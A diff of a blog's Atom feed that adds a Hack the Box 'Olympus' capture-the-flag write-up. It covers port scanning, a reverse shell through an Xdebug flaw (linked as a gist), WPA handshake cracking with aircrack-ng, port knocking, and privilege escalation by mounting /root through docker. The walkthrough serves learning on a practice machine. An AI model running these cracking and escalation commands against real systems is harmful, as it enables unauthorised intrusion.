@@ -1,4 +1,257 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="http://fasetto.github.io/atom.xml" rel="self" type="application/atom+xml" /><link href="http://fasetto.github.io/" rel="alternate" type="text/html" /><updated>2018-09-20T15:11:49+03:00</updated><id>http://fasetto.github.io/</id><title type="html">fasetto’s blog</title><subtitle>Full Stack Developer, UI &amp; UX Designer</subtitle><author><name>fasetto</name></author><entry><title type="html">{Hack the Box} \\ Canape Write-Up</title><link href="http://fasetto.github.io/hack-the-box-canape/" rel="alternate" type="text/html" title="{Hack the Box} \\ Canape Write-Up" /><published>2018-09-15T00:00:00+03:00</published><updated>2018-09-15T00:00:00+03:00</updated><id>http://fasetto.github.io/hack-the-box-canape</id><content type="html" xml:base="http://fasetto.github.io/hack-the-box-canape/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-canape.png&quot; alt=&quot;repository-pattern.png&quot; /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="http://fasetto.github.io/atom.xml" rel="self" type="application/atom+xml" /><link href="http://fasetto.github.io/" rel="alternate" type="text/html" /><updated>2018-09-21T19:36:17+03:00</updated><id>http://fasetto.github.io/</id><title type="html">fasetto’s blog</title><subtitle>Full Stack Developer, UI &amp; UX Designer</subtitle><author><name>fasetto</name></author><entry><title type="html">{Hack the Box} \\ Olympus Write-Up</title><link href="http://fasetto.github.io/hack-the-box-olympus/" rel="alternate" type="text/html" title="{Hack the Box} \\ Olympus Write-Up" /><published>2018-09-21T00:00:00+03:00</published><updated>2018-09-21T00:00:00+03:00</updated><id>http://fasetto.github.io/hack-the-box-olympus</id><content type="html" xml:base="http://fasetto.github.io/hack-the-box-olympus/">&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/htb-olympus.png&quot; alt=&quot;olympus&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;hi-everyone&quot;&gt;Hi everyone,&lt;/h2&gt;
+
+&lt;p&gt;In this article I’ll show you guys how I pwned &lt;strong&gt;Olympus&lt;/strong&gt; machine on &lt;a href=&quot;https://hackthebox.eu&quot;&gt;Hack the Box&lt;/a&gt;. &lt;br /&gt;
+Lets start..
+&lt;!-- more--&gt;&lt;/p&gt;
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;First thing we need to do is enumerating ports. I will be using &lt;strong&gt;masscan&lt;/strong&gt; for quicly enumerating all ports.&lt;br /&gt;
+I recommend you to use this awesome tool.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@89e502fff05a:~/pentest/hack-the-box/machines/olympus# masscan -p1-65535 10.10.10.83 --rate=200 -e tun0
+
+Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2018-09-20 16:08:21 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 2222/tcp on 10.10.10.83
+Discovered open port 53/tcp on 10.10.10.83
+Discovered open port 80/tcp on 10.10.10.83
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;There are some ports opened. Lets run &lt;strong&gt;nmap&lt;/strong&gt; for more information.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@89e502fff05a:~/pentest/hack-the-box/machines/olympus# nmap -sS -sV -sC -p53,80,2222 -o nmap.txt 10.10.10.83
+Nmap scan report for 10.10.10.83
+Host is up (0.074s latency).
+
+PORT     STATE SERVICE VERSION
+53/tcp   open  domain  (unknown banner: Bind)
+| dns-nsid:
+|_  bind.version: Bind
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
+|     version
+|     bind
+|_    Bind
+80/tcp   open  http    Apache httpd
+|_http-title: Crete island - Olympus HTB
+2222/tcp open  ssh     (protocol 2.0)
+| fingerprint-strings:
+|   NULL:
+|_    SSH-2.0-City of olympia
+| ssh-hostkey:
+|   2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 (RSA)
+|   256 79:90:c0:3d:43:6c:8d:72:19:60:45:3c:f8:99:14:bb (ECDSA)
+|_  256 f8:5b:2e:32:95:03:12:a3:3b:40:c5:11:27:ca:71:52 (ED25519)
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Apache is running in port 80. We have a web page. &lt;br /&gt;
+Lets check it first.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/ctMAzrvXAYYHsqQKgkWvv.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is a picture as background of body. I looked the source code of the page and nothing is usefull. So I thought maybe thats a &lt;strong&gt;steganography&lt;/strong&gt; challenge ? &lt;br /&gt;
+Downloaded that image and run &lt;strong&gt;steghide&lt;/strong&gt; and &lt;strong&gt;binwalk&lt;/strong&gt; on it. And I got nothing. &lt;br /&gt;
+And I decided to take a look at the server response, maybe I can find something.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/NuKtO7Shmhm3kY9XFpivR.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Yeah. Thats realy interesting. &lt;strong&gt;Xdebug&lt;/strong&gt; is a &lt;strong&gt;PHP&lt;/strong&gt; extension for debugging.&lt;br /&gt;
+That header also tells us the version of xdebug. I searched on google and I saw that version has a vulnerabilty.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploitation-stage-one&quot;&gt;Exploitation (stage-one)&lt;/h2&gt;
+&lt;p&gt;I wrote a simple script that drops me a &lt;strong&gt;reverse-shell.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/fasetto/c057b9154262af2b2d1ef39a08cd13df.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/GGHxg1j6TnVSWR1unl5ZL.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/vi3yKoTtNjpVyKKXA24Da.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration-from-the-inside&quot;&gt;Enumeration from the inside&lt;/h2&gt;
+&lt;p&gt;I am &lt;strong&gt;www-data&lt;/strong&gt; now. Thats good but I realized that box is actually a &lt;strong&gt;docker container.&lt;/strong&gt; &lt;br /&gt;
+That means we are not inside the real box. Anyway, I found a &lt;strong&gt;zeus&lt;/strong&gt; username in &lt;strong&gt;/etc/passwd&lt;/strong&gt; file. I looked the &lt;strong&gt;/home/zeus&lt;/strong&gt; dir. &lt;br /&gt;
+I saw &lt;strong&gt;airgeddon&lt;/strong&gt; folder, here:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 .
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..
+-rw-r--r-- 1 zeus zeus    264 Apr  8 00:58 .editorconfig
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 .git
+-rw-r--r-- 1 zeus zeus    230 Apr  8 00:58 .gitattributes
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 .github
+-rw-r--r-- 1 zeus zeus     89 Apr  8 00:58 .gitignore
+-rw-r--r-- 1 zeus zeus  15855 Apr  8 00:58 CHANGELOG.md
+-rw-r--r-- 1 zeus zeus   3228 Apr  8 00:58 CODE_OF_CONDUCT.md
+-rw-r--r-- 1 zeus zeus   6358 Apr  8 00:58 CONTRIBUTING.md
+-rw-r--r-- 1 zeus zeus   3283 Apr  8 00:58 Dockerfile
+-rw-r--r-- 1 zeus zeus  34940 Apr  8 00:58 LICENSE.md
+-rw-r--r-- 1 zeus zeus   4425 Apr  8 00:58 README.md
+-rw-r--r-- 1 zeus zeus 297711 Apr  8 00:58 airgeddon.sh
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 binaries
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 captured
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 imgs
+-rw-r--r-- 1 zeus zeus  16315 Apr  8 00:58 known_pins.db
+-rw-r--r-- 1 zeus zeus 685345 Apr  8 00:58 language_strings.sh
+-rw-r--r-- 1 zeus zeus     33 Apr  8 00:58 pindb_checksum.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;That &lt;strong&gt;captured&lt;/strong&gt; folder is interesting. I looked inside and:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 .
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..
+-rw-r--r-- 1 zeus zeus 297917 Apr  8 12:48 captured.cap
+-rw-r--r-- 1 zeus zeus     57 Apr  8 17:30 papyrus.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;papyrustxt&quot;&gt;papyrus.txt&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Captured while flying. I'll banish him to Olympia - Zeus
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;That message maybe could help later.&lt;/p&gt;
+
+&lt;h4 id=&quot;capturedcap&quot;&gt;captured.cap&lt;/h4&gt;
+&lt;p&gt;I copied that file using netcat. When you transfering something always make sure the file is not broken, check the &lt;strong&gt;md5sum&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/yYZzt9rFgRHne3Xxhz2QC.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/r7YpKpJqrzEgVeAwwlZqX.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I dedided to crack the file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/FNOIlsW1sjjK7DwVRCwwW.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng captured.cap -w ~/pentest/wordlist/rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/6m9G8Eatjc18yG1zrAxdD.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;SSID: &lt;strong&gt;Too_cl0se_to_th3_Sun&lt;/strong&gt; noted.&lt;br /&gt;
+After 20-30 mins later &lt;strong&gt;aircrack-ng&lt;/strong&gt; cracked the file.&lt;br /&gt;
+The password is &lt;strong&gt;flightoficarus&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;stage-two&quot;&gt;Stage Two&lt;/h2&gt;
+&lt;p&gt;I tried to connect to the machine using &lt;strong&gt;ssh&lt;/strong&gt; with username &lt;strong&gt;zeus&lt;/strong&gt; and passwords I found, but didn’t worked.&lt;br /&gt;
+Than I thought, I know I am in a &lt;strong&gt;docker container.&lt;/strong&gt; There isn’t another user on that container.
+There must be another container or actual box itself. &lt;br /&gt;
+So I tried with username &lt;strong&gt;icarus&lt;/strong&gt; and passwords I found. It worked.&lt;br /&gt;
+&lt;strong&gt;icarus&lt;/strong&gt; is the right username, and the password is &lt;strong&gt;Too_cl0se_to_th3_Sun&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh icarus@10.10.10.83 -p 2222
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/QHsUB1EOWKPmUfsg0CfcT.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration-1&quot;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;Found something interesting again. &lt;strong&gt;ctfolympus.htb&lt;/strong&gt; &lt;br /&gt;
+Lets add this domain in our &lt;strong&gt;/etc/hosts&lt;/strong&gt; file.&lt;/p&gt;
+
+&lt;p&gt;I already checked that &lt;strong&gt;dns service&lt;/strong&gt; I found earlier with &lt;strong&gt;nmap.&lt;/strong&gt; &lt;br /&gt;
+But I didn’t find anything. Lets check again.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@89e502fff05a:~# dig axfr @10.10.10.83 ctfolympus.htb
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.11.4-4-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr @10.10.10.83 ctfolympus.htb
+; (1 server found)
+;; global options: +cmd
+ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
+ctfolympus.htb.		86400	IN	TXT	&quot;prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!&quot;
+ctfolympus.htb.		86400	IN	A	192.168.0.120
+ctfolympus.htb.		86400	IN	NS	ns1.ctfolympus.htb.
+ctfolympus.htb.		86400	IN	NS	ns2.ctfolympus.htb.
+ctfolympus.htb.		86400	IN	MX	10 mail.ctfolympus.htb.
+crete.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
+hades.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
+mail.ctfolympus.htb.	86400	IN	A	192.168.0.120
+ns1.ctfolympus.htb.	86400	IN	A	192.168.0.120
+ns2.ctfolympus.htb.	86400	IN	A	192.168.0.120
+rhodes.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
+RhodesColossus.ctfolympus.htb. 86400 IN	TXT	&quot;Here lies the great Colossus of Rhodes&quot;
+www.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
+ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
+;; Query time: 79 msec
+;; SERVER: 10.10.10.83#53(10.10.10.83)
+;; WHEN: Fri Sep 21 15:06:00 UTC 2018
+;; XFR size: 15 records (messages 1, bytes 475)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This message looks interesting..&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;As I could understand there is another place to go. &lt;strong&gt;3456, 8234, 62431&lt;/strong&gt; these numbers also weird. &lt;br /&gt;
+&lt;strong&gt;prometheus&lt;/strong&gt; must be a username, &lt;strong&gt;St34l_th3_F1re!&lt;/strong&gt; must be password. I tried with ssh again but didn’t worked. &lt;br /&gt;
+I was stucked here. But my friend &lt;strong&gt;Kunal&lt;/strong&gt; told me about &lt;strong&gt;port-knocking.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;I searched on google and found these great articles.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu &lt;br /&gt;
+https://www.bgasecurity.com/2014/05/port-knocking-yontemi-ile-portlar/&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Basicly the &lt;strong&gt;port 22&lt;/strong&gt; is opened but &lt;strong&gt;hidden&lt;/strong&gt;. We can’t access directly. But if we knock specific ports in a particular order, &lt;strong&gt;knockd&lt;/strong&gt; service catch that &lt;strong&gt;sequence&lt;/strong&gt; and allow us to connect.&lt;br /&gt;
+Doen’t matter if that ports closed or not.&lt;/p&gt;
+
+&lt;h2 id=&quot;stage-three&quot;&gt;Stage three&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt install knockd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@89e502fff05a:~# knock ctfolympus.htb 3456 8234 62431 &amp;amp;&amp;amp; ssh prometheus@ctfolympus.htb
+prometheus@ctfolympus.htb's password: St34l_th3_F1re!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/lZTNC0tYSK7ShGy1981NB.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the &lt;strong&gt;home&lt;/strong&gt; folder of &lt;strong&gt;prometheus&lt;/strong&gt; there is a message from gods.&lt;br /&gt;
+That message I think useless.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/ARjmzMZfYnuK02Dy8SxiO.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I’m in &lt;strong&gt;docker&lt;/strong&gt; users group. Thats important.&lt;br /&gt;
+Lets have a look at &lt;strong&gt;docker images&lt;/strong&gt; and &lt;strong&gt;containers.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/XCy8la6s2XDnJ8aM1BzKv.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-root&quot;&gt;Getting root&lt;/h2&gt;
+&lt;p&gt;I want root flag, right ?&lt;br /&gt;
+Docker allow us to share our data between our machine and docker containers. So all I need to do is bind the &lt;strong&gt;/root&lt;/strong&gt; partition and I can read what I want..&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run --rm -it -v /root:/pwned olympia /bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;It will create new container and execute the &lt;strong&gt;/bin/bash&lt;/strong&gt; for us.
+&lt;strong&gt;–rm&lt;/strong&gt; flag means delete the container when we exit.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/UWGSsYw47VtnweuMEwSbN.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Or we could use like this for just grab the flag..&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run --rm -it -v /root:/pwned olympia /bin/bash -c &quot;/bin/cat /pwned/root.txt&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/zf4jhAcZOJ1RJuLXF7Tzg.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Almost forgot, I wanna show you guys how &lt;strong&gt;knockd&lt;/strong&gt; daemon configured on this machine.
+Check this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/olympus/Fb6i6t2YgwO5ztA7tHDEj.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thats it for &lt;strong&gt;Olympus.&lt;/strong&gt; I learned a few things from this machine. &lt;br /&gt;
+If you have a question or something you can leave a comment.&lt;br /&gt;
+See you guys later.&lt;/p&gt;</content><author><name>fasetto</name></author><category term="writeup" /><category term="olympus" /><category term="pentest" /><category term="hackthebox" /><summary type="html">Hi everyone, In this article I’ll show you guys how I pwned Olympus machine on Hack the Box. Lets start..</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://fasetto.github.io/assets/images/htb-olympus.png" /></entry><entry><title type="html">{Hack the Box} \\ Canape Write-Up</title><link href="http://fasetto.github.io/hack-the-box-canape/" rel="alternate" type="text/html" title="{Hack the Box} \\ Canape Write-Up" /><published>2018-09-15T00:00:00+03:00</published><updated>2018-09-15T00:00:00+03:00</updated><id>http://fasetto.github.io/hack-the-box-canape</id><content type="html" xml:base="http://fasetto.github.io/hack-the-box-canape/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-canape.png&quot; alt=&quot;repository-pattern.png&quot; /&gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h1 id=&quot;hi-everyone&quot;&gt;Hi everyone,&lt;/h1&gt;
 
